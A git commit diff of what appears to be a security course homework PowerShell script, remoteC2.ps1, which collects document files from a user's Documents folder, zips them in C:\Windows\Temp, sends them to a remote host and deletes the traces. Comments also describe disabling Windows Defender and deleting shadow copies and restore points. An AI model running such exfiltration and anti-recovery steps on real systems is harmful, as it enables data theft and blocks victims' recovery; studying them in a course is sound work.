ab5c9a7e2241468b8f1ae42c732f3cc5da7188e2
ecrawford-0 <61421800+ecrawford-0@users.noreply.github.com>
2022-04-22 21:44:52 -0400

    Update remoteC2.ps1

--- SYS320-SP22/Week13/homework/remoteC2.ps1
+++ SYS320-SP22/Week13/homework/remoteC2.ps1
@@ -1,28 +1,28 @@
 <#
-Task 1: 
+Week 13 Task 1: 
 Search the file system looking for docx, xlsx, pdf, and txt files 
 copy these to a folder. Then zip the folder and scp to remote host 
 #>
 
 # Look for all the files
 $filelist = Get-ChildItem -recurse -Include *.pdf,*.xlsx,*.docx, *.txt `
- -Path .\Documents
+.\Documents\ | export-csv -Path files.csv
+
+# import the csv file
+$filelist= import-csv -Path .\files.csv #-header FullName
 
 # Create a new folder in the temp directory  
 New-Item -Path "C:\Windows\Temp\" -Name "Files" -ItemType "directory"
 
 $destinationFolder = "C:\Windows\Temp\Files"
 # Loop through the results and add them the folder
-foreach ($f in $fileList)
+foreach ($f in $filelist)
 {
     Copy-Item $f.FullName -Destination $destinationFolder
 }
 
 # zip the folder
 Compress-Archive -Path $destinationFolder -DestinationPath $destinationFolder
-
-# deletes the unzipped folder
-Remove-Item -Path $destinationFolder -Recurse
 
 # Move the files to the remote server
 
@@ -41,16 +41,20 @@ Remove-Item -Path $destinationFolder -Recurse
   {
       Write-Host -BackgroundColor "Red" -ForegroundColor "white" " Files were not uploaded!"
   }
+
+
+# deletes the unzipped folder
+Remove-Item -Path $destinationFolder -Recurse
+
 # delete the zip file off the host
 Remove-Item -Path "C:\Windows\Temp\Files.zip"
 
 <#
-Task 2:
+Week 13 Task 2:
 Turn off windows defender and delete volume shadow copies and restore points
 None of these commandlets are actually run because I have an antivirus so Windows Defender 
-is already turned off, because Controlled Folder access is aprt of Windows Defender it wouldn't work in my specific machine.
-As well 
-
+is already turned off, because Controlled Folder access is apart of Windows Defender it wouldn't work in my specific machine.
+Even trying to open controlled folder access errors out for that reason
 #>
 
 # Turn off windows defender 
